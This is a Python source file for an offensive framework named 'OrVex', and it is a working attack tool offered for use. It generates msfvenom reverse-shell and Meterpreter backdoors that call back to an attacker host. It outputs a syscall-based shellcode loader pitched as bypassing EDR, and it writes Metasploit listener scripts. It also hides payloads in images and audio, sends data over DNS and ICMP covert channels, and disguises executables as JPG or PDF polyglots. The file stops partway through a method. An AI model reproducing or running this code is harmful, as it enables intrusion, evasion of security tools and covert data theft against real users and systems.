#!/usr/bin/env python3
"""
OrVex Menu System - Version 2.1.0
"""

import os
import sys
import subprocess
import platform
import shutil
from pathlib import Path
from typing import Optional, Dict, Any

# Ajouter le chemin du projet
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.banner import OrVexUI, Fore, Style

# IMPORTER LES MODULES DE STÉGANOGRAPHIE
from modules.steganography.image_steg import ImageSteganography
from modules.steganography.audio_steg import AudioSteg
from modules.steganography.text_steg import ZeroWidthSteg, WhitespaceSteg
from modules.steganography.network_steg import DNSCovertChannel, ICMPCovertChannel
from modules.steganography.polyglot import PolyglotGenerator

class OrVexMenu:
    """Gestionnaire de menu principal"""
    
    def __init__(self):
        self.ui = OrVexUI()
        self.config = self.load_config()
        self.is_windows = platform.system().lower() == 'windows'
        self.is_linux = platform.system().lower() == 'linux'
    
    def load_config(self) -> Dict[str, Any]:
        """Charge la configuration"""
        config_file = os.path.expanduser("~/.orvex/config.yaml")
        if os.path.exists(config_file):
            try:
                import yaml
                with open(config_file, 'r', encoding='utf-8') as f:
                    return yaml.safe_load(f)
            except:
                pass
        return {
            'lhost': '192.168.1.100',
            'lport': 4444,
            'output_dir': 'output/'
        }
    
    def save_config(self):
        """Sauvegarde la configuration"""
        os.makedirs(os.path.expanduser("~/.orvex"), exist_ok=True)
        try:
            import yaml
            with open(os.path.expanduser("~/.orvex/config.yaml"), 'w', encoding='utf-8') as f:
                yaml.dump(self.config, f)
        except:
            pass
    
    def run(self):
        """Boucle principale"""
        self.ui.show_warning()
        
        while True:
            self.ui.show_menu()
            
            try:
                choice = input(f"\n{Fore.RED}[{Fore.WHITE}OrVex{Fore.RED}]{Fore.WHITE}--[menu]: {Style.RESET_ALL}")
                
                # Payload Generation
                if choice in ['01', '1']: 
                    self.create_msfvenom_backdoor()
                elif choice in ['02', '2']: 
                    self.create_fud_backdoor()
                elif choice in ['03', '3']: 
                    self.create_syscall_backdoor()
                elif choice in ['04', '4']: 
                    self.backdoor_factory()
                elif choice in ['05', '5']: 
                    self.backdoor_apk()
                elif choice in ['06', '6']: 
                    self.create_debian_package()
                elif choice in ['07', '7']: 
                    self.backdoor_office()
                
                # Image Steg
                elif choice in ['08', '8']: 
                    self.stego_image_lsb_hide()
                elif choice == '09': 
                    self.stego_image_lsb_extract()
                elif choice == '10': 
                    self.stego_image_bitplane_hide()
                elif choice == '11': 
                    self.stego_image_bitplane_extract()
                elif choice == '12': 
                    self.stego_image_dct_hide()
                
                # Audio Steg
                elif choice == '13': 
                    self.stego_audio_lsb_hide()
                elif choice == '14': 
                    self.stego_audio_lsb_extract()
                elif choice == '15': 
                    self.stego_audio_echo_hide()
                elif choice == '16': 
                    self.stego_audio_echo_extract()
                
                # Text Steg
                elif choice == '17': 
                    self.stego_text_zwc_hide()
                elif choice == '18': 
                    self.stego_text_zwc_extract()
                elif choice == '19': 
                    self.stego_text_whitespace_hide()
                
                # Network Steg
                elif choice == '20': 
                    self.stego_network_dns_send()
                elif choice == '21': 
                    self.stego_network_dns_server()
                elif choice == '22': 
                    self.stego_network_icmp_send()
                
                # Polyglot
                elif choice == '23': 
                    self.polyglot_png_zip()
                elif choice == '24': 
                    self.polyglot_jpg_exe()
                elif choice == '25': 
                    self.polyglot_pdf_exe()
                
                # Tools
                elif choice == '26': 
                    self.auto_listeners()
                elif choice == '27': 
                    self.jump_to_msfconsole()
                elif choice == '28': 
                    self.searchsploit()
                elif choice == '29': 
                    self.file_pumper()
                elif choice == '30': 
                    self.configure_settings()
                elif choice == '31': 
                    self.cleanup()
                elif choice == '32': 
                    self.show_help()
                elif choice == '33': 
                    self.show_credits()
                elif choice == '34': 
                    self.exit_program()
                
                else:
                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
                    self.ui.press_enter()
                    
            except KeyboardInterrupt:
                self.exit_program()
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
                if self.config.get('debug', False):
                    import traceback
                    traceback.print_exc()
                self.ui.press_enter()
    
    # ==================== PAYLOAD GENERATION ====================
    
    def create_msfvenom_backdoor(self):
        """Option 01: Create Backdoor with msfvenom"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] MSFVenom Backdoor Generator{Style.RESET_ALL}\n")
        
        if not shutil.which('msfvenom'):
            print(f"{Fore.RED}[!] msfvenom not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        print("  [1] Windows x64 Meterpreter")
        print("  [2] Windows x86 Meterpreter")
        print("  [3] Linux x64 Reverse TCP")
        
        choice = input(f"\n{Fore.RED}[?]{Fore.WHITE} Choice: {Style.RESET_ALL}")
        
        lhost = input(f"LHOST [{self.config.get('lhost', '192.168.1.100')}]: ") or str(self.config.get('lhost', '192.168.1.100'))
        lport = input(f"LPORT [{self.config.get('lport', 4444)}]: ") or str(self.config.get('lport', 4444))
        
        default_output = "payload.exe"
        output = input(f"Output [{default_output}]: ") or default_output
        output_path = os.path.join('output', output)
        
        payload_map = {
            '1': ('windows/x64/meterpreter/reverse_tcp', 'exe'),
            '2': ('windows/meterpreter/reverse_tcp', 'exe'),
            '3': ('linux/x64/shell_reverse_tcp', 'elf'),
        }
        
        if choice in payload_map:
            payload, ext = payload_map[choice]
        else:
            payload = 'windows/x64/meterpreter/reverse_tcp'
            ext = 'exe'
        
        os.makedirs("output", exist_ok=True)
        
        cmd = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', ext, '-o', output_path]
        
        print(f"\n{Fore.YELLOW}[*] Generating...{Style.RESET_ALL}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if os.path.exists(output_path):
            size = os.path.getsize(output_path)
            print(f"{Fore.GREEN}[✓] Payload created: {output_path} ({size} bytes){Style.RESET_ALL}")
            self._generate_listener(lhost, lport, payload)
        else:
            print(f"{Fore.RED}[✗] Error: {result.stderr}{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def create_syscall_backdoor(self):
        """Option 03: Direct Syscalls Backdoor"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Direct Syscall Backdoor{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[!] Bypasses EDR hooks{Style.RESET_ALL}\n")
        
        lhost = input(f"LHOST [{self.config.get('lhost', '192.168.1.100')}]: ") or str(self.config.get('lhost', '192.168.1.100'))
        lport = input(f"LPORT [{self.config.get('lport', 4444)}]: ") or str(self.config.get('lport', 4444))
        
        print(f"\n{Fore.CYAN}Technique:{Style.RESET_ALL}")
        print("  [1] Hell's Gate")
        print("  [2] Halos Gate")
        
        tech = input(f"\n{Fore.RED}[?]{Fore.WHITE} Choice [1]: {Style.RESET_ALL}") or "1"
        
        try:
            from modules.evasion.syscalls import SyscallManager, HalosGate
            
            if tech == '1':
                header = SyscallManager.generate_c_header()
            else:
                header = HalosGate.generate_c_header()
            
            os.makedirs("output", exist_ok=True)
            header_file = "output/syscalls.h"
            with open(header_file, "w", encoding='utf-8') as f:
                f.write(header)
            
            print(f"{Fore.GREEN}[✓] Syscall stubs generated: {header_file}{Style.RESET_ALL}")
            
        except ImportError:
            print(f"{Fore.YELLOW}[!] Syscall module not available{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def _generate_syscall_loader(self, lhost: str, lport: int) -> str:
        """Génère le loader C pour syscalls"""
        return f'''#include <windows.h>
#include <stdio.h>
#include "syscalls.h"

unsigned char payload[] = {{ 
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,
    0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,
    0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72
}};

int main() {{
    printf("[*] OrVex Syscall Loader\\n");
    printf("[*] Target: {lhost}:{lport}\\n\\n");
    
    HANDLE hProcess = GetCurrentProcess();
    LPVOID pMemory = NULL;
    SIZE_T size = sizeof(payload);
    
    SysNtAllocateVirtualMemory(hProcess, &pMemory, 0, &size, 
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (pMemory) {{
        memcpy(pMemory, payload, sizeof(payload));
        
        HANDLE hThread = NULL;
        SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                           (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, 0, 0, 0, NULL);
        
        if (hThread) {{
            printf("[+] Payload executed via syscalls!\\n");
            SysNtWaitForSingleObject(hThread, FALSE, NULL);
        }}
    }}
    
    return 0;
}}
'''
    
    # ==================== STEGANOGRAPHY - IMAGE ====================
    
    def stego_image_lsb_hide(self):
        """Option 08: LSB Hide in PNG"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] LSB Image Steganography - Hide{Style.RESET_ALL}\n")
        
        image_path = input("Image path: ")
        if not os.path.exists(image_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        payload_path = input("Payload file: ")
        if not os.path.exists(payload_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        output_path = input("Output image: ") or "output/stego.png"
        os.makedirs("output", exist_ok=True)
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        stego = ImageSteganography()
        if stego.lsb_embed(image_path, payload, output_path):
            print(f"{Fore.GREEN}[✓] Payload hidden in {output_path}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Failed{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def stego_image_lsb_extract(self):
        """Option 09: LSB Extract from PNG"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] LSB Image Steganography - Extract{Style.RESET_ALL}\n")
        
        image_path = input("Image with hidden payload: ")
        if not os.path.exists(image_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        output_path = input("Output file: ") or "output/extracted.bin"
        os.makedirs("output", exist_ok=True)
        
        stego = ImageSteganography()
        payload = stego.lsb_extract(image_path)
        
        if payload:
            with open(output_path, 'wb') as f:
                f.write(payload)
            print(f"{Fore.GREEN}[✓] Payload extracted to {output_path} ({len(payload)} bytes){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] No payload found{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def stego_image_bitplane_hide(self):
        """Option 10: Bit Plane Hide"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Bit Plane Steganography - Hide{Style.RESET_ALL}\n")
        
        image_path = input("Image path: ")
        if not os.path.exists(image_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        payload_path = input("Payload file: ")
        if not os.path.exists(payload_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        plane = input("Bit plane (0-7) [0]: ") or "0"
        output_path = input("Output image: ") or f"output/bitplane_{plane}.png"
        os.makedirs("output", exist_ok=True)
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        stego = ImageSteganography()
        if stego.bit_plane_embed(image_path, payload, int(plane), output_path):
            print(f"{Fore.GREEN}[✓] Payload hidden in plane {plane}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Failed{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def stego_image_bitplane_extract(self):
        """Option 11: Bit Plane Extract"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Bit Plane Steganography - Extract{Style.RESET_ALL}\n")
        
        image_path = input("Image with hidden payload: ")
        if not os.path.exists(image_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        plane = input("Bit plane (0-7) [0]: ") or "0"
        output_path = input("Output file: ") or "output/extracted_bitplane.bin"
        os.makedirs("output", exist_ok=True)
        
        stego = ImageSteganography()
        payload = stego.bit_plane_extract(image_path, int(plane))
        
        if payload:
            with open(output_path, 'wb') as f:
                f.write(payload)
            print(f"{Fore.GREEN}[✓] Payload extracted from plane {plane}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] No payload found{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def stego_image_dct_hide(self):
        """Option 12: DCT Hide (JPG)"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] DCT Steganography - Hide{Style.RESET_ALL}\n")
        
        image_path = input("JPG image path: ")
        if not os.path.exists(image_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        payload_path = input("Payload file: ")
        if not os.path.exists(payload_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        quality = input("JPEG quality (75-95) [85]: ") or "85"
        output_path = input("Output image: ") or "output/stego_dct.jpg"
        os.makedirs("output", exist_ok=True)
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        stego = ImageSteganography()
        if stego.dct_embed(image_path, payload, output_path, int(quality)):
            print(f"{Fore.GREEN}[✓] Payload hidden in DCT coefficients{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Failed (OpenCV required){Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    # ==================== STEGANOGRAPHY - AUDIO ====================
    
    def stego_audio_lsb_hide(self):
        """Option 13: Audio LSB Hide"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Audio LSB Steganography - Hide{Style.RESET_ALL}\n")
        
        audio_path = input("WAV file path: ")
        if not os.path.exists(audio_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        payload_path = input("Payload file: ")
        if not os.path.exists(payload_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        output_path = input("Output audio: ") or "output/stego_audio.wav"
        os.makedirs("output", exist_ok=True)
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        stego = AudioSteg()
        if stego.lsb_embed(audio_path, payload, output_path):
            print(f"{Fore.GREEN}[✓] Payload hidden in audio{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Failed{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def stego_audio_lsb_extract(self):
        """Option 14: Audio LSB Extract"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Audio LSB Steganography - Extract{Style.RESET_ALL}\n")
        
        audio_path = input("WAV with hidden payload: ")
        if not os.path.exists(audio_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        output_path = input("Output file: ") or "output/extracted_audio.bin"
        os.makedirs("output", exist_ok=True)
        
        stego = AudioSteg()
        payload = stego.lsb_extract(audio_path)
        
        if payload:
            with open(output_path, 'wb') as f:
                f.write(payload)
            print(f"{Fore.GREEN}[✓] Payload extracted ({len(payload)} bytes){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] No payload found{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def stego_audio_echo_hide(self):
        """Option 15: Echo Hiding Hide"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Echo Hiding - Hide{Style.RESET_ALL}\n")
        
        audio_path = input("WAV file path: ")
        if not os.path.exists(audio_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        payload_path = input("Payload file: ")
        if not os.path.exists(payload_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        delay = input("Echo delay (ms) [1.0]: ") or "1.0"
        decay = input("Echo decay [0.5]: ") or "0.5"
        output_path = input("Output audio: ") or "output/stego_echo.wav"
        os.makedirs("output", exist_ok=True)
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        stego = AudioSteg()
        if stego.echo_embed(audio_path, payload, output_path, float(delay), float(decay)):
            print(f"{Fore.GREEN}[✓] Payload hidden with echo{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Failed{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def stego_audio_echo_extract(self):
        """Option 16: Echo Hiding Extract"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Echo Hiding - Extract{Style.RESET_ALL}\n")
        
        audio_path = input("WAV with hidden payload: ")
        if not os.path.exists(audio_path):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        delay = input("Echo delay (ms) [1.0]: ") or "1.0"
        output_path = input("Output file: ") or "output/extracted_echo.bin"
        os.makedirs("output", exist_ok=True)
        
        stego = AudioSteg()
        payload = stego.echo_extract(audio_path, float(delay))
        
        if payload:
            with open(output_path, 'wb') as f:
                f.write(payload)
            print(f"{Fore.GREEN}[✓] Payload extracted from echo ({len(payload)} bytes){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] No payload found{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    # ==================== STEGANOGRAPHY - TEXT ====================
    
    def stego_text_zwc_hide(self):
        """Option 17: Zero-Width Characters Hide"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Zero-Width Text Steganography - Hide{Style.RESET_ALL}\n")
        
        cover_text = input("Cover text: ")
        secret_msg = input("Secret message: ")
        output_file = input("Output file: ") or "output/stego_text.txt"
        os.makedirs("output", exist_ok=True)
        
        stego = ZeroWidthSteg()
        stego_text = stego.encode(cover_text, secret_msg)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(stego_text)
        
        print(f"{Fore.GREEN}[✓] Message hidden in text ({len(secret_msg)} chars){Style.RESET_ALL}")
        self.ui.press_enter()
    
    def stego_text_zwc_extract(self):
        """Option 18: Zero-Width Characters Extract"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Zero-Width Text Steganography - Extract{Style.RESET_ALL}\n")
        
        text_file = input("Text file with hidden message: ")
        if not os.path.exists(text_file):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        with open(text_file, 'r', encoding='utf-8') as f:
            stego_text = f.read()
        
        stego = ZeroWidthSteg()
        message = stego.decode(stego_text)
        
        if message:
            print(f"{Fore.GREEN}[✓] Hidden message: {message}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] No message found{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def stego_text_whitespace_hide(self):
        """Option 19: Whitespace Encoding"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Whitespace Steganography - Hide{Style.RESET_ALL}\n")
        
        text_file = input("Text file to modify: ")
        if not os.path.exists(text_file):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        secret_msg = input("Secret message: ")
        output_file = input("Output file: ") or "output/whitespace.txt"
        os.makedirs("output", exist_ok=True)
        
        with open(text_file, 'r', encoding='utf-8') as f:
            text = f.read()
        
        stego = WhitespaceSteg()
        stego_text = stego.encode(text, secret_msg)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(stego_text)
        
        print(f"{Fore.GREEN}[✓] Message hidden with whitespace{Style.RESET_ALL}")
        self.ui.press_enter()
    
    # ==================== STEGANOGRAPHY - NETWORK ====================
    
    def stego_network_dns_send(self):
        """Option 20: DNS Covert Channel Send"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] DNS Covert Channel - Send{Style.RESET_ALL}\n")
        
        domain = input("Domain (e.g., example.com): ")
        data = input("Data to send: ")
        
        dns = DNSCovertChannel(domain)
        success = dns.send_data(data.encode())
        
        if success:
            print(f"{Fore.GREEN}[✓] Data sent via DNS{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Failed to send{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def stego_network_dns_server(self):
        """Option 21: DNS Covert Server"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] DNS Covert Channel - Server{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[!] Requires root privileges{Style.RESET_ALL}\n")
        
        print("Starting DNS server on port 53...")
        print("Press Ctrl+C to stop")
        
        try:
            dns = DNSCovertChannel("localhost")
            dns.start_server(lambda data: print(f"Received: {data}"))
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Server stopped{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def stego_network_icmp_send(self):
        """Option 22: ICMP Covert Channel"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] ICMP Covert Channel - Send{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[!] Requires root privileges{Style.RESET_ALL}\n")
        
        target = input("Target IP: ")
        data = input("Data to send: ")
        
        icmp = ICMPCovertChannel(target)
        success = icmp.send_ping(data.encode())
        
        if success:
            print(f"{Fore.GREEN}[✓] Data sent via ICMP{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Failed to send (root required){Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    # ==================== POLYGLOT FILES ====================
    
    def polyglot_png_zip(self):
        """Option 23: PNG+ZIP Polyglot"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] PNG+ZIP Polyglot Generator{Style.RESET_ALL}\n")
        
        png_file = input("PNG file: ")
        if not os.path.exists(png_file):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        zip_file = input("ZIP file to hide: ")
        if not os.path.exists(zip_file):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        output_file = input("Output file: ") or "output/polyglot.png"
        os.makedirs("output", exist_ok=True)
        
        if PolyglotGenerator.create_png_zip(png_file, zip_file, output_file):
            print(f"{Fore.GREEN}[✓] Polyglot created{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Failed{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def polyglot_jpg_exe(self):
        """Option 24: JPG+EXE Polyglot"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] JPG+EXE Polyglot Generator{Style.RESET_ALL}\n")
        
        jpg_file = input("JPG file: ")
        if not os.path.exists(jpg_file):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        exe_file = input("EXE file to hide: ")
        if not os.path.exists(exe_file):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        output_file = input("Output file: ") or "output/polyglot.jpg"
        os.makedirs("output", exist_ok=True)
        
        if PolyglotGenerator.create_jpg_exe(jpg_file, exe_file, output_file):
            print(f"{Fore.GREEN}[✓] Polyglot created{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Failed{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def polyglot_pdf_exe(self):
        """Option 25: PDF+EXE Polyglot"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] PDF+EXE Polyglot Generator{Style.RESET_ALL}\n")
        
        pdf_file = input("PDF file: ")
        if not os.path.exists(pdf_file):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        exe_file = input("EXE file to hide: ")
        if not os.path.exists(exe_file):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        output_file = input("Output file: ") or "output/polyglot.pdf"
        os.makedirs("output", exist_ok=True)
        
        if PolyglotGenerator.create_pdf_exe(pdf_file, exe_file, output_file):
            print(f"{Fore.GREEN}[✓] Polyglot created{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Failed{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    # ==================== TOOLS ====================
    
    def auto_listeners(self):
        """Option 26: Auto Listeners"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Auto Listener Generator{Style.RESET_ALL}\n")
        
        lhost = input(f"LHOST [{self.config.get('lhost', '192.168.1.100')}]: ") or str(self.config.get('lhost', '192.168.1.100'))
        lport = input(f"LPORT [{self.config.get('lport', 4444)}]: ") or str(self.config.get('lport', 4444))
        
        listener_rc = f"""# Metasploit listener for OrVex
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
        
        os.makedirs("output/listeners", exist_ok=True)
        listener_file = f"output/listeners/listener_{lport}.rc"
        
        with open(listener_file, 'w', encoding='utf-8') as f:
            f.write(listener_rc)
        
        print(f"{Fore.GREEN}[✓] Listener generated: {listener_file}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}To run: msfconsole -r {listener_file}{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def jump_to_msfconsole(self):
        """Option 27: Jump to msfconsole"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Launching Metasploit...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Type 'exit' to return{Style.RESET_ALL}\n")
        
        try:
            subprocess.run(["msfconsole"], shell=True)
        except:
            print(f"{Fore.RED}[!] msfconsole not found{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def searchsploit(self):
        """Option 28: Searchsploit"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Searchsploit{Style.RESET_ALL}\n")
        
        search_term = input("Search term: ")
        if search_term:
            try:
                subprocess.run(["searchsploit", search_term])
            except:
                print(f"{Fore.RED}[!] searchsploit not found{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def file_pumper(self):
        """Option 29: File Pumper"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] File Pumper{Style.RESET_ALL}\n")
        
        input_file = input("Input file: ")
        if not os.path.exists(input_file):
            print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
            self.ui.press_enter()
            return
        
        output_file = input("Output file: ") or f"{input_file}.pumped"
        size_mb = input("Size to add (MB) [10]: ") or "10"
        
        try:
            size_bytes = int(float(size_mb) * 1024 * 1024)
            
            with open(input_file, 'rb') as fin:
                data = fin.read()
            
            with open(output_file, 'wb') as fout:
                fout.write(data)
                fout.write(b'\x00' * size_bytes)
            
            original_size = os.path.getsize(input_file)
            new_size = os.path.getsize(output_file)
            
            print(f"{Fore.GREEN}[✓] File pumped!{Style.RESET_ALL}")
            print(f"    Original: {original_size} bytes")
            print(f"    New: {new_size} bytes")
            
        except Exception as e:
            print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")
        
        self.ui.press_enter()
    
    def configure_settings(self):
        """Option 30: Configure Settings"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Configuration{Style.RESET_ALL}\n")
        
        print(f"Current settings:")
        print(f"  LHOST: {self.config.get('lhost', '192.168.1.100')}")
        print(f"  LPORT: {self.config.get('lport', 4444)}")
        
        lhost = input(f"\nNew LHOST [{self.config['lhost']}]: ") or self.config['lhost']
        lport = input(f"New LPORT [{self.config['lport']}]: ") or str(self.config['lport'])
        
        self.config['lhost'] = lhost
        self.config['lport'] = int(lport)
        self.save_config()
        
        print(f"{Fore.GREEN}[✓] Configuration saved{Style.RESET_ALL}")
        self.ui.press_enter()
    
    def cleanup(self):
        """Option 31: Cleanup"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}[*] Cleaning up...{Style.RESET_ALL}")
        
        if os.path.exists("output"):
            shutil.rmtree("output")
        
        os.makedirs("output")
        os.makedirs("output/listeners", exist_ok=True)
        
        print(f"{Fore.GREEN}[✓] Cleanup completed{Style.RESET_ALL}")
        self.ui.press_enter()
    
    def show_help(self):
        """Option 32: Help"""
        self.ui.clear_screen()
        print(f"{Fore.CYAN}═══════════════════════════════════════════════{Style.RESET_ALL}")
        print(f"{Fore.WHITE}                      HELP{Style.RESET_ALL}")
        print(f"{Fore.CYAN}═══════════════════════════════════════════════{Style.RESET_ALL}")
        print("""
  OrVex is an advanced exploitation framework with:
  • Direct syscalls for EDR evasion
  • Multi-format steganography (image, audio, text, network)
  • Cross-platform payload generation
  • Polyglot file creation
  • Metasploit integration

  All generated files are saved in the 'output/' directory.
        """)
        self.ui.press_enter()
    
    def show_credits(self):
        """Option 33: Credits"""
        self.ui.show_credits()
        self.ui.press_enter()
    
    def exit_program(self):
        """Option 34: Exit"""
        print(f"\n{Fore.YELLOW}[*] 🛡️  OrVex terminated!{Style.RESET_ALL}")
        sys.exit(0)
    
    def _generate_listener(self, lhost: str, lport: int, payload: str):
        """Génère un fichier listener RC"""
        os.makedirs("output/listeners", exist_ok=True)
        rc_file = f"output/listeners/listener_{lport}.rc"
        
        with open(rc_file, 'w', encoding='utf-8') as f:
            f.write(f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
""")
        
        print(f"{Fore.CYAN}    Listener: {rc_file}{Style.RESET_ALL}")
    
    # ==================== PLACEHOLDERS (à implémenter plus tard) ====================
    
    def create_fud_backdoor(self): 
        print(f"{Fore.YELLOW}[!] Coming soon{Style.RESET_ALL}")
        self.ui.press_enter()
    
    def backdoor_factory(self):
        print(f"{Fore.YELLOW}[!] Coming soon{Style.RESET_ALL}")
        self.ui.press_enter()
    
    def backdoor_apk(self):
        print(f"{Fore.YELLOW}[!] Coming soon{Style.RESET_ALL}")
        self.ui.press_enter()
    
    def create_debian_package(self):
        print(f"{Fore.YELLOW}[!] Coming soon{Style.RESET_ALL}")
        self.ui.press_enter()
    
    def backdoor_office(self):
